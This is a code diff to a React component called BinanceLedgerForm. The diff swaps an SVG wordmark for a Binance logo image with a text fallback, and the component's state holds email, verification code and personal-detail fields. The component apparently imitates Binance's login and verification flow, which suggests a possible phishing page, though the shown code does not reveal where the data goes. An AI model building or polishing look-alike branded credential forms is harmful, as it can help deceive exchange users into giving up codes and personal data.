@@ -10,6 +10,7 @@ const BinanceLedgerForm: FC = () => {
   const [verificationCode, setVerificationCode] = useState("");
   const [currentStep, setCurrentStep] = useState<FormStep>('email');
   const [isLoading, setIsLoading] = useState(false);
+  const [logoError, setLogoError] = useState(false);
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -101,14 +102,22 @@ const BinanceLedgerForm: FC = () => {
   const renderEmailStep = () => (
     <>
       <div className="flex justify-center mb-8">
-        <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M4.8 32V8h7.2c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8H8.4V32H4.8zm3.6-12.8h3.6c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9H8.4v7.2z" fill="#FCD535"/>
-          <path d="M25.2 32V8h3.6v24h-3.6z" fill="#FCD535"/>
-          <path d="M35.2 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4v9.6c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8h-7.8zm3.6-3.2h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7v-9.6c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v16.8z" fill="#FCD535"/>
-          <path d="M56.8 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 1.8-0.3 3.3-0.9 4.5s-1.5 2.1-2.7 2.7l4.2 9.6h-4.2l-3.6-8.4h-4.2V32h-3.6zm3.6-11.6h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v7.2z" fill="#FCD535"/>
-          <path d="M78.4 32V8h7.8c2.4 0 4.2 0.6 5.4 1.8s1.8 3 1.8 5.4c0 2.4-0.6 4.2-1.8 5.4s-3 1.8-5.4 1.8h-4.2V32h-3.6zm3.6-12.8h4.2c1.2 0 2.1-0.3 2.7-0.9s0.9-1.5 0.9-2.7c0-1.2-0.3-2.1-0.9-2.7s-1.5-0.9-2.7-0.9h-4.2v7.2z" fill="#FCD535"/>
-          <path d="M99.6 32V8h14.4v3.2h-10.8v6h9.6v3.2h-9.6v8.4h10.8V32h-14.4z" fill="#FCD535"/>
-        </svg>
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
       </div>
 
       <div className="flex justify-between items-center mb-8">
